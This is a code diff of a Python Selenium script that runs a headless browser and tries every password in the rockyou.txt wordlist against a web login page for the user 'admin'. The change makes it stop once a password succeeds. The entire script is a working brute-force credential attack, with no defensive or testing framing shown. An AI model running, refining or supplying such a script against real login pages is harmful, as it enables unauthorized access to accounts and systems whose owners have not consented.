@@ -3,10 +3,7 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-def lin(filename):
-    with open(filename, 'r') as file:
-        for line in file:
-            yield line.strip()
+
 def login(username, password):
     chrome_options = Options()
     chrome_options.add_argument("--headless")
@@ -26,17 +23,17 @@ def login(username, password):
         error_message = WebDriverWait(driver, 5).until(
             EC.presence_of_element_located((By.CLASS_NAME, "errornote"))
         )
-        print("Error: " + error_message.text)
         return False
     except:
-        print("Login successful!")
         return True
     finally:
         driver.quit()
-for line in lin("/Users/lung/Documents/rockyou.txt"):
-    word = login("admin", line)
-    if word:
-        print("succeeded for {} and {}".format("admin", line))
-    else:
-        print("failed for {} and {}".format("admin", line))
+with open("/Users/lung/Documents/rockyou.txt", "r") as file:
+    for line in file:
+        word = login("admin", line.strip())
+        if word:
+            print("Succeeded for 'admin' and {}".format(line.strip()))
+            break
+        else:
+            print("Failed for 'admin' and {}".format(line.strip()))
 
